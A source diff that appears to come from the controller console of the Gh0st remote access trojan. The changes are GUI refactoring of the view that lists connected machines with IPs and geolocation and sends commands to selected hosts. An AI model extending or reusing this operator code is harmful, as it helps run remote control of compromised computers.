@@ -37,11 +37,12 @@
 static char THIS_FILE[] = __FILE__;
 #endif
 
-extern CGh0stView* g_pTabView;
-extern CPcView* g_pConnectView;
-extern CMainFrame* g_pFrame;
-extern CLogView* g_pLogView; 
-extern CShowNum* g_pNumDlg;
+CPcView*		g_pConnectView;
+
+extern CGh0stView*	g_pTabView;
+extern CMainFrame*	g_pFrame;
+extern CLogView*	g_pLogView; 
+extern CShowNum*	g_pNumDlg;
 
 typedef struct
 {
@@ -260,12 +261,14 @@ void CPcView::OnInitialUpdate()
 
 //	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);		
 //	EnableUserSortColor(false);
+	/*
 	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
 	m_header.SubclassWindow(hWndHeader);
 	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
+	*/
 //	CXTPPaintManager::SetTheme(xtpThemeOffice2003);	
 //	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);
-	CXTPPaintManager::SetTheme(xtpThemeOfficeXP);
+	//CXTPPaintManager::SetTheme(xtpThemeOfficeXP);
 }
 
 void CPcView::NewInitialUpdate()
@@ -333,11 +336,11 @@ void CPcView::NewInitialUpdate()
 //	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);	
 //	EnableUserSortColor(false);
 	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
-	m_header.SubclassWindow(hWndHeader);
-	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
+	//m_header.SubclassWindow(hWndHeader);
+	//m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
 //	CXTPPaintManager::SetTheme(xtpThemeOffice2003);	
 //	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);
-	CXTPPaintManager::SetTheme(xtpThemeOfficeXP);
+	//CXTPPaintManager::SetTheme(xtpThemeOfficeXP);
 }
 
 void CPcView::OnSize(UINT nType, int cx, int cy) 
@@ -552,17 +555,12 @@ LRESULT CPcView::OnAddToList(WPARAM wParam, LPARAM lParam)
         }
 
 
-/////////////////////////////////////////////////////////////////////地理位置
+		//地理位置
 		if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
-		{
 			str = m_QQwry->IPtoAdd(IPAddress);
-			m_pListCtrl->SetItemText(i, 12, str);
-		}
 		else
-		{
-			m_pListCtrl->SetItemText(i, 12, "找不到IP数据库");
-		}
-/////////////////////////////////////////////////////////////////////
+			str = "找不到IP数据库";
+		m_pListCtrl->SetItemText(i, 12, str);
 
 		// 外网IP
 		m_pListCtrl->SetItemText(i, 1, IPAddress);
@@ -837,7 +835,7 @@ LRESULT CPcView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
 	for (int n = 0; n < nTabs; n++ )
 	{
-		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
+		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItem_GetHandle(n)));
 		// 删除链表过程中可能会删除Context
 		try
 		{
@@ -955,7 +953,7 @@ void CPcView::SendALLSelectCommand(PBYTE pData, UINT nSize)
 	for (int n = 0; n < nTabs; n++ )
 	{
 
-		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
+		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItem_GetHandle(n)));
 		int nCnt = pView->m_pListCtrl->GetItemCount();
 
 		POSITION pos = pView->m_pListCtrl->GetFirstSelectedItemPosition();
@@ -995,7 +993,7 @@ void CPcView::SendSelectCommand(PBYTE pData, UINT nSize)
 		m_pListCtrl->SetCheck(nItem,TRUE);                
 	}
  	CPcView* pView = NULL;		
-	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
+	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItemSel_GetHandle()));
 		
 	int nItems = pView->m_pListCtrl->GetItemCount();       
 	int p = 0;
@@ -1039,8 +1037,8 @@ void CPcView::SortColumn(int iCol, bool bAsc)
 	
 	// set sort image for header and sort column.
 	//	m_listCtrl.SetSortImage(m_nSortedCol, m_bAscending);
-	CXTSortClass csc(m_pListCtrl, m_nSortedCol);
-	csc.Sort(m_bAscending, xtSortString);
+	//CXTSortClass csc(m_pListCtrl, m_nSortedCol);
+	//csc.Sort(m_bAscending, xtSortString);
 }
 
 BOOL CPcView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
@@ -1415,7 +1413,7 @@ void CPcView::OnChangeGroup()
 		int count = g_pTabView->m_wndTabControl.GetItemCount();
 		for ( int i = 0; i < count; i++ )
 		{
-			strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
+			strTemp = g_pTabView->TCItem_GetText(i);
 			int n = strTemp.ReverseFind('(');
 			if ( n > 0)
 			{
@@ -1427,7 +1425,7 @@ void CPcView::OnChangeGroup()
 			}
 			if ( strGroupName == m_group.strGroup )
 			{
-				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
+				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItem_GetHandle(i)));
 				break;
 			}
 		}
@@ -1435,7 +1433,7 @@ void CPcView::OnChangeGroup()
 		{
 			strTemp.Format( "%s(0)", m_group.strGroup );
 			g_pTabView->AddGroup( strTemp );
-			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(count)->GetHandle()));
+			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItem_GetHandle(count)));
 			pView->NewInitialUpdate();
 			pView->m_iocpServer = m_iocpServer;
 		}
